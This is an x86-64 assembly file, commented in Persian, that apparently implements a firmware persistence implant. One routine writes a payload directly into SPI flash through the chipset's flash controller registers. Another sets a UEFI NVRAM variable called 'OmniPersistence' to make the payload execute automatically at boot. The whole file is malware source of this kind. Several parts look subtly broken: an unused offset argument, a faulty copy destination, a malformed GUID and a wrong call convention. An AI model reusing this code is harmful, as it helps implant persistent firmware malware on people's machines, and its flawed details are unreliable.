section .text
global write_spi_flash, install_persistence

%include "hardware.inc"

write_spi_flash:
    ; RDI = آدرس داده
    ; RSI = اندازه
    ; RDX = آفست SPI
    
    ; فعال‌سازی دسترسی SPI
    mov rax, 0xFED1F800          ; آدرس ثبت SPI
    mov dword [rax + SPI_HSFS], 0 ; پاک‌سازی وضعیت
    
    ; فعال‌سازی نوشتن
    mov dword [rax + SPI_HSFC], SPI_HSFC_FDBC_MASK | SPI_HSFC_FCYCLE_WRITE
    
    ; کپی داده به بافر
    mov rcx, rsi
    mov rsi, rdi
    mov rdi, [rax + SPI_FDATA0]
    rep movsb
    
    ; آغاز عملیات نوشتن
    mov dword [rax + SPI_HSFC], SPI_HSFC_FDBC_MASK | SPI_HSFC_FCYCLE_WRITE | SPI_HSFC_FGO
    
    ; انتظار برای تکمیل
    .wait:
        test dword [rax + SPI_HSFS], SPI_HSFS_FDONE
        jz .wait
    
    ret

install_persistence:
    ; نوشتن پیلود به SPI Flash
    mov rdi, [payloads + SPI_PAYLOAD]
    mov rsi, [spi_payload_size]
    mov rdx, SPI_UEFI_OFFSET
    call write_spi_flash
    
    ; دستکاری NVRAM برای اجرای خودکار
    mov rax, [uefi_runtime_services]
    mov rdi, EFI_VARIABLE_NV | EFI_VARIABLE_RT | EFI_VARIABLE_BOOTSERVICE_ACCESS
    mov rsi, var_name
    mov rdx, vendor_guid
    mov rcx, spi_payload_size
    mov r8, [payloads + SPI_PAYLOAD]
    call [rax + EFI_SET_VARIABLE]
    
    ret

section .data
var_name          db "OmniPersistence",0
vendor_guid       dd 0x12345678, 0x9abc, 0xdef0, 0x123456789abc
spi_payload_size  dq 4096

